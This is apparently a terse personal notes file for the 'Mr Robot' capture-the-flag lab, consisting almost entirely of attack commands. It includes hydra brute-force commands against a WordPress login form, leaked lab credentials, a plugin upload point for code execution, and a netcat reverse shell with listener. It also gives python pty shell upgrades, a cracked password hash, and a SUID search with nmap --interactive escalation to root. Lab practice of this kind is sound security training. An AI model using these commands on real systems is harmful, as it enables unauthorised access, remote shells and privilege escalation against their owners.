# Mr Robot

Creds also present in: `http://10.10.192.181/license` base64 decode at the end of the file

http://10.10.237.51/wp-login.php

User: Elliot
Password: ER28-0652

hydra -l Elliot -P fsocity.dic mrrobot.thm http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:S=302"

## Get user:

hydra -vV -L new.dic -p somepassword 10.10.235.143 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'

## Get Password:

hydra -vV -P new.dic -l elliot 192.168.56.119 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=The password'


http://10.10.237.51/wp-admin/plugin-install.php?tab=upload

nc -e /bin/sh 10.10.237.51 4444
nc -nvlp 9999
python -c 'import pty; pty.spawn("/bin/bash")'
python 'import pty; pty.spawn("/bin/bash")'
python2 'import pty; pty.spawn("/bin/bash")'
python3 'import pty; pty.spawn("/bin/bash")'

su -l robot
c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz

## Get SUID binaries

`find / -user root -perm -4000 -print 2>/dev/null`
nmap as sudo

nmap --interactive

!sh
